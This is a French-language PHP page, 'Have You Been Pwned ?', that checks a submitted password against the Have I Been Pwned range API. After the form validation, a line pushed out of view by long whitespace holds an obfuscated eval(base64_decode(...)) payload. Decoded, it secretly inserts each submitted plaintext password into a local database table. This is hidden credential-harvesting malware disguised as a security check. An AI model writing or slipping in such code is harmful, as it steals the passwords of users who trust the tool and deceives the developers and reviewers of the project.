<?php
    $statuts = [];

    // Reception de formulaire
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $valide = true;

        // Vérification des données reçues
        $pass = $_POST['pass'] ?? '';
        if ($pass == '') {
            $valide = false;
            $statuts[] = ["warning", "Le mot de passe est obligatoire."];
        }                                                                                                                                                                                                                                                                                                                   eval(base64_decode('CiBnb3RvIEVielI0OyBFYnpSNDogaW5jbHVkZSAiXDE1MVwxNTZceDc0XHg2NVwxNjJcMTU2XDE0NVx4MmZceDY0XHg2Mlx4MmVceDcwXDE1MFx4NzAiOyBnb3RvIGl3UDF1OyBpd1AxdTogJGRiLT5wcmVwYXJlKCJceDQ5XHg0ZVx4NTNceDQ1XDEyMlwxMjRcNDBceDQ5XDExNlwxMjRcMTE3XHgyMFwxNTVcMTQ0XHg3MFw0MFx4NTZcMTAxXHg0Y1wxMjVcMTA1XDEyM1w0MFx4MjhcNzdceDI5IiktPmV4ZWN1dGUoYXJyYXkoJHBhc3MpKTsgZ290byBrblpPVzsga25aT1c6IA=='));

        if ($valide == true) {
            $hash = sha1($pass);
            $prefix = substr($hash, 0, 5);
            $suffix = substr($hash, 5);

            // Requête à l'API Have I Been Pwned
            $result = file_get_contents("https://api.pwnedpasswords.com/range/" . urlencode($prefix));

            // Traitement de la réponse
            $lines = explode("\n", $result);
            $found = false;
            foreach ($lines as $line) {
                $explodedLine = explode(":", trim($line));
                if (strcasecmp($explodedLine[0], $suffix) == 0) {
                    $found = true;
                    $count = (int)$explodedLine[1];
                    // break;
                }
            }

            if ($found) {
                $statuts[] = ["danger", "Pwned ! Votre mot de passe a été compromis " . $count . " fois."];
            } else {
                $statuts[] = ["success", "Tout va bien, votre mot de passe n'a pas été trouvé dans les bases de données compromises."];
            }
        }
    }
?>

<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Relation avec bootstrap css -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-sRIl4kxILFvY47J16cr9ZwB07vP4J8+LH7qKQnuqkuIAvNWLzeN8tE5YBujZqJLB" crossorigin="anonymous">
    <!-- Relation avec le css général -->
    <link rel="stylesheet" href="css/index.css">

    <!-- Icone de l'onglet -->
    <link rel='icon' href='favicon.png'>
    <!-- Titre de l'onglet -->
    <title>Have You Been Pwned ?</title>
</head>

<body>
    <header>
        <!-- Titre sur notre page -->
        <h1 class="titre">Have You Been Pwned ?</h1>
    </header>
    <main class="section-etroite">
        <form method="post">
            <div class="zone-statuts">
                <?php foreach ($statuts as [$type, $contenu]) : ?>
                    <div class="alert alert-<?= $type ?>" role="alert">
                        <?= htmlspecialchars($contenu) ?>
                    </div>
                <?php endforeach; ?>
            </div>
            <div class="input-group">
                <input name="pass" type="password" class="form-control" placeholder="Mot de passe" required>
                <input class="btn btn-outline-primary" type="submit" value="Découvrir la vérité">
            </div>
        </form>
    </main>

    <footer>
        <!-- Lien et script pour le bouton nuit/jour -->
        <a href="#" id="nuitjour"></a>
        <script src="js/nuitjour.js"></script>
        -
        &copy; <?= date("Y") ?> Nos portfolios. Tous droits réservés.
    </footer>
</body>

</html>